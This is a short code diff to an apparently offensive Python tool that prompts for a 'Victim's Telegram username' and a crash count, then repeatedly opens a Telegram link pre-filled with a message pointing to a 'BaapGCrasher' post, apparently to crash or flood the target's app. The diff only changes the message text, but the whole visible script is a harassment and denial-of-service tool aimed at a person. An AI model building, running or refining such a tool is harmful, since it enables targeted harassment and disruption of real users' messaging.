@@ -34,7 +34,7 @@ def main():
 	number=input(f"{G}[+] Enter the Victim's Telegram username not use \n\n{G}=> ")
 	print()
 	crash=int(input(f'[+] Enter the number of crashes {W}(Max 50per 10Min) \n\n=> '))
-	link = (f"""xdg-open https://t.me/{number}/?text=https://t.me/BaapGCrasher/8""")
+	link = (f"""xdg-open https://t.me/{number}/?text=12HHHhttps://t.me/BaapGCrasher/8""")
 	for i in range (crash):
 		print()
 		print(f"{Y}[✓] Sending Now")
